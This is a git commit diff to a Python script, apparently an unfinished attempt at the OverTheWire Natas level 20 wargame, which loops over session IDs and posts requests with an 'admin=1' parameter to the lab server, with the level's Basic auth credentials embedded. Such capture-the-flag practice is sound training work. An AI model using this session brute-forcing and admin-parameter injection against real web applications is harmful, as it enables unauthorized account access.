9b310b90e2e3ca65e2a53ecde319533d467b522b
jesse mailhot <coshmeo@gmail.com>
2022-02-03 20:19:06 -0800

    tried a couple things, still no solution.

--- 20/payload.py
+++ 20/payload.py
@@ -6,9 +6,9 @@ headers = {'Authorization': 'Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpd
 url = 'http://natas20.natas.labs.overthewire.org/index.php'
 
 for i in range(0,641):
-    payload = '?admin=1&name=natas21&sid={}-admin'.format(i)
+    payload = '?admin=1&name=&sid={}-admin'.format(i)
     r = requests.post(url+payload, headers=headers)
-    if 'exists' in r.text:
+    if 'next' in r.text:
         soup = BeautifulSoup(r.text, 'html.parser')
         print(soup.find_all(id='content'))
         break
